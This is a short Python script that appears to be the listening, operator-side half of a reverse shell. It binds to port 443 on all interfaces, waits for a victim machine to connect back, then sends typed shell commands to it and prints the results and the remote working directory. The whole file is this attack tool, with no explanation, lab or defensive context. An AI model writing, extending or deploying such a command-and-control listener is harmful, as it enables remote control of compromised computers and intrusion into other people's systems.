import socket

server_host="0.0.0.0"
server_port=443
BUFFER_SIZE=1024*1000
separator="<sep>"

s=socket.socket()
s.bind((server_host,server_port))
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.listen(5)
print(f"listening as {server_host}:{server_port}")

client_socket,client_address=s.accept()
print(f"{client_address[0]}:{client_address[1]} connected")

cwd=client_socket.recv(BUFFER_SIZE).decode()
print("current working directory",cwd)

while True:
    command=input(f"{cwd} $> ")
    
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command=="exit":
        break
    output =client_socket.recv(BUFFER_SIZE).decode()
    results,cwd=output.split(separator)
    print(results)
client_socket.close()
s.close()